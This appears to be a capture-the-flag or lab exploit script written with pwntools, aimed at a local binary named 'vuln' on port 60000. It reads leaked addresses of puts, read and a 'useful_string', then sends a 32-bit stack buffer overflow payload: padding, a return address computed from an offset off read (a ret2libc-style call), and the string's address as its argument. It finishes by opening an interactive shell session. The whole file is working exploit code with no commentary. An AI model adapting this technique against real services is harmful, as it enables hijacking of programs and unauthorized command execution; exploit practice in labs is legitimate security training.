from pwn import *

elf = ELF('vuln')
r = remote("localhost", 60000 )

def getAddr( name ):
    r.recvuntil('%s: '%name )
    addr = int( r.recvline()[:-1], 16)
    info( "%s: 0x%x"%(name, addr ))
    return addr

puts = getAddr( "puts" )
read = getAddr( "read" )
useful_string = getAddr("useful_string")

payload = b''
payload += b'A'*0x9c
payload += b'BBBB'
payload += p32( read - 0x99af0) 
payload += b'CCCC'
payload += p32( useful_string )


r.sendlineafter('g:\n', payload )

r.interactive()
